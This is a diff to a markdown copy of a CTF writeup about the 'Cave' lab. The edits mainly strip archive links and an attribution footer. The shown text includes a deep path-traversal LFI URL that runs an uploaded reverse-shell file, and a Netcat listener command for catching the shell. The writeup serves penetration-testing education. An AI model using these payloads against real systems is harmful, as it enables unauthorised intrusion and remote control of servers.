@@ -7,7 +7,7 @@
 
 ## 📝 Full Writeup
 
-CTF Writeup: Breaking the Cave Lab through LFI and SUID Misconfigurations[![Ankush Prasad Sah](https://web.archive.org/web/20260110070303im_/https://miro.medium.com/v2/da:true/resize:fill:64:64/0*fMPZ_g-BSr7CrDq2)
+CTF Writeup: Breaking the Cave Lab through LFI and SUID Misconfigurations[![Ankush Prasad Sah](https://miro.medium.com/v2/da:true/resize:fill:64:64/0*fMPZ_g-BSr7CrDq2)
 
 ](/web/20260110070303/https://medium.com/@ankushprasadsah47?source=post_page---byline--54fb132050c5---------------------------------------)
 
@@ -21,7 +21,6 @@ Just now
 ](/web/20260110070303/https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F54fb132050c5&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40ankushprasadsah47%2Fctf-writeup-breaking-the-cave-lab-through-lfi-and-suid-misconfigurations-54fb132050c5&user=Ankush+Prasad+Sah&userId=0edc41fe88a3&source=---header_actions--54fb132050c5---------------------clap_footer------------------)
 
 --
-
 
 
 ## Hacking the “Cave”: A Web-Application Penetration Testing Writeup
@@ -41,7 +40,7 @@ The web application was found to have an **Unrestricted File Upload** vulnerabil
 
 **LFI Trigger:** The uploaded file was executed by exploiting a **Local File Inclusion (LFI)** vulnerability via deep path traversal in the `page` parameter:
 
-[http://<machine_ip>/?page=....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/var/www/uploads/rev_shell.php_00.jpg](https://web.archive.org/web/20260110070303/http://10.81.144.113/?page=....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2Fvar%2Fwww%2Fuploads%2Frev_shell.php_00.jpg)
+[http://<machine_ip>/?page=....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/var/www/uploads/rev_shell.php_00.jpg](http://10.81.144.113/?page=....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2Fvar%2Fwww%2Fuploads%2Frev_shell.php_00.jpg)
 
 **Reverse Shell:** A Netcat listener was established on the Kali machine (`nc -nlvp 4444`) to catch the incoming connection.
 
@@ -102,6 +101,3 @@ The compromise of “Cave” highlights the danger of combining minor vulnerabil
 **Author:** Ankush Prasad Sah
 
 ---
-
-*📖 Originally published on [Medium](https://medium.com/@ankushprasadsah47/ctf-writeup-breaking-the-cave-lab-through-lfi-and-suid-misconfigurations-54fb132050c5). All credit goes to the original author.*
-*📂 Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
